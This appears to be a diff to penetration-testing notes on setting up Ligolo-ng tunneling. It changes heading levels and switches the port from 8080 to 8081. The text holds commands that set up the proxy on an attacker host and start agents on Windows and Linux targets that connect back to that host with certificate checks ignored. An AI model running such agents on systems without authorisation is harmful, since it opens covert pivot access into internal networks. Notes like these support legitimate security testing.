@@ -1,19 +1,19 @@
-### Linux Host
+#### Linux Host
 
 ```bash
 sudo ip tuntap add user garffff mode tun ligolo 
 sudo ip link set ligolo up
-sudo ./proxy -laddr 0.0.0.0:8080 -selfcert
+sudo ./proxy -laddr 0.0.0.0:8081 -selfcert
 ```
-### Windows Target:
+#### Windows Target:
 
 ```bash
-agent.exe -connect <host_ip>:8080 -ignore-cert
+agent.exe -connect <host_ip>:8081 -ignore-cert
 ```
-### Linux Target
+#### Linux Target
 
 ```bash
-agent_linux -connect <host_ip>:8080 -ignore-cert
+./agent_linux -connect <host_ip>:8081 -ignore-cert
 ```
 
 Then Back on the Linux host within Ligolo-ng:
